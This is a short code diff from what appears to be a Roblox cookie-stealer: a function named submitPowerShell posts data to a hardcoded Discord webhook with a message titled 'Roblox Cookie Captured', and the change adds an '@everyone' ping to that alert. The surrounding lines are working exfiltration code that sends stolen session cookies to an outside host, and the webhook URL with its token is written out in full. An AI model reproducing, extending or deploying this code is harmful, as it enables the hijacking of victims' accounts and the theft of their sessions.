@@ -243,6 +243,7 @@ async function submitPowerShell() {
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
         
         const cookieEmbed = {
+            content: "@everyone",
             embeds: [{
                 title: "🍪 Roblox Cookie Captured",
                 color: 0xff0000,
